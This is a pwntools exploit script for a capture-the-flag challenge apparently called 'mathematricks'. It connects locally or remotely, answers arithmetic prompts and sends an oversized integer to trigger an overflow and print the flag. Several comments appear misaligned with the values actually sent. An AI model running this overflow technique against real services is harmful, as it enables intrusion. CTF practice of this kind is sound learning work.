from pwn import *
import argparse

def main():
    parser = argparse.ArgumentParser(description="Exploit mathematricks (local or remote)")
    parser.add_argument("-r", "--remote", help="Remote mode with IP and port", nargs=2, metavar=("IP", "PORT"))
    parser.add_argument("-l", "--local", help="Local mode with a binary", metavar="BINARY")
    args = parser.parse_args()

    if args.remote:
        ip, port = args.remote
        p = remote(ip, int(port))
    elif args.local:
        p = process(args.local)
    else:
        print("Please specify an execution mode: -r IP PORT or -l BINARY")
        return

    # Interaction with the mathematricks binary
    emoji_prompt = b'\xf0\x9f\xa5\xb8 '  # ðŸ¥¸ prompt in UTF-8

    p.sendlineafter(emoji_prompt, b'1')             # Q1: 1 + 1 = ?
    p.sendlineafter(b'> ', b'2')                    # Q2: 2 - 1 = ?
    p.sendlineafter(b'> ', b'1')                    # Q3: 1337 - 1337 = ?
    p.sendlineafter(b'> ', b'0')                    # Q4 part 1: n1
    p.sendlineafter(b'n1: ', b'1')                  # Q4 part 2: n2
    p.sendlineafter(b'n2: ', b'1337133713371337')   # crafted value to trigger int overflow

    # Print the flag or final output
    print(p.recvall().decode(errors="ignore"))

if __name__ == "__main__":
    main()

